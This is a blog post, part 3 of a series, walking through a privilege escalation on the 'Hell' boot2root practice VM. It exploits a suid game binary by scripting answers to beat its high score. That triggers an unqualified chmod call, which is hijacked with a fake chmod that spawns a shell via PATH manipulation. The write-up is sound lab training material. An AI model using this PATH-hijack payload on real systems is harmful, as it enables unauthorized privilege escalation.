---
author: recrudesce
comments: false
date: 2014-07-19 19:05:34+00:00
layout: post
slug: hell-walkthrough-part-3
title: Hell Walkthrough - Part 3
wordpress_id: 118
categories:
- VM's
tags:
- boot2root
- g0tmi1k
- hacking
- hell
- nmap
- peleus
- vulnhub
---

[Part 1](http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/) | [Part 2](http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/) | Part 3 | [Part 4](http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/) | [Part 5](http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/)



## I Want to Play a Game, But No Jigsaws, OK ?!


The home folder for milk_4_life is pretty sparse, just a binary called "game". However, it's owned by the george user, and has the suid attribute set.


``` bash
$ ls -l
total 20
---s--x--x 1 george      george      5743 Jun 19 18:24 game
```


Running the binary produces the following output, which doesn't tell us much other than it's "listening". Like a overly intrusive neighbour.
<!-- more -->


``` bash

$ ./game
I'm listening
```


Netstat isn't available on this VM, so we have to find another way to obtain listening port information. Thankfully ss saves the day and shows the game binary IS actually listening, on port 1337 - h4x !


``` bash

$ ss -lp
State       Recv-Q Send-Q    Local Address:Port    Peer Address:Port
LISTEN      0      50        127.0.0.1:mysql       *:*
LISTEN      0      128       :::sunrpc             :::*
LISTEN      0      128       *:sunrpc              *:*
LISTEN      0      128       :::http               :::*
LISTEN      0      128       :::38035              :::*
LISTEN      0      128       *:35380               *:*
LISTEN      0      128       :::ssh                :::*
LISTEN      0      128       *:ssh                 *:*
LISTEN      0      10        *:1337                *:*
LISTEN      0      20        ::1:smtp              :::*
LISTEN      0      20        127.0.0.1:smtp        *:*
LISTEN      0      10        *:666                 *:*
```


Connecting to the port from another session asks us to type "START" to begin. It's more fun to troll the code, though, by typing something completely different. Did you expect anything less of me ?


``` bash

$ telnet 127.0.0.1 1337
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Type 'START' to begin

banana
No... START. S-T-A-R-T

Connection closed by foreign host.
```


OK, enough messing around, let's see what this game does. Typing START presents us with a high score, and then math questions that only your high school math teacher would ask you infront of the rest of the class. Needless to say I'm not answering any of these correctly !


``` bash

$ telnet 127.0.0.1 1337
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Type 'START' to begin

START
Starting...

You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)

Quick what's... 924 x 541? Umm
Quick what's... 982 x 21? No idea
Quick what's... 194 x 542? Really ?
Quick what's... 679 x 733? WHY WOULD I NEED TO KNOW THIS !?
Quick what's... 960 x 248? I give up.
Quick what's... 718 x 646? THANKS OBAMA !
Quick what's... 162 x 784? ^C
Connection closed by foreign host
```


Being the competitive person I am, I figured it would be fun to try and beat the score. More than 133723 points in 30 seconds means I have to answer 4457 correct answers a second. I can type quickly, but not that quickly. This requires some scripting - Python to the rescue ! This script connects to the game, reads the question, splits it based on " x " to get both numbers, performs the multiplication and sends the answer back. Granted I had some help on with this code - thanks c0ne !


``` python

#!/usr/bin/python
import socket
import re

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('127.0.0.1',1337)) # hardcoded IP address
s.recv(1024)
s.send('START\n') # login procedure
s.recv(110)
while True:
    d = s.recv(200)
    l = re.findall(r"Quick what's... (.*?)\?", d)
    if not l:
        print d
        break
    (a,b) = l[0].split(' x ')
    mul = int(a) * int(b)
    print str(mul)
    s.send(str(mul)+'\n')

print s.recv(1024)
s.close()
```


Running it produces a sense of authority over our robot overlords - I'm gaming the game.


``` bash

$ python gamey3.py
125451
150858
498300
493353
60564
**** SNIP ****
174386
841312
53636
Final Score: 412619

!*!*!*!*! Congratulations, new high score (412619) !*!*!*!*!

I hear the faint sound of chmodding.......
```


![high_score_320x320](http://fourfourfourfour.co/wp-content/uploads/2014/07/high_score_320x320.png)

It seems that the binary performs an action when the highscore is beaten. I'm not sure what it chmods, but I wonder if we can play this game at it's own game and make it run a bogus binary. There's a distinct possibility the code is relying on the PATH environment variable and just calling system("chmod file") rather than using an absolute path.

So, a bogus chmod binary is created using the following source, compiled, placed in /tmp on the VM and made executable (do I need to show you how to do this ? No ? Good. Saves me the typing.)

[c]#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
 setuid( 1000 );
 system("id");
 system( "/bin/sh -i" );
}
```


The path environment variable is modified to make /tmp the first location checked


``` bash
$ PATH=/tmp:$PATH
$ export | grep PATH
export PATH='/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games'

```


So, hopefully, if all goes to plan, when we beat the score it should run our fake chmod binary and drop us to a shell. How about we give it a go ? The game is started, and the Python script is run to beat the score (I'm not going to show you again, just scroll up if you want to see what it looks like).

The score is beaten and we are indeed dropped to a new shell as the george user.


``` bash

$ ./game
I'm listening
uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
$

```


![](http://31.media.tumblr.com/tumblr_lwipupOVfN1qh59n0o1_500.gif)
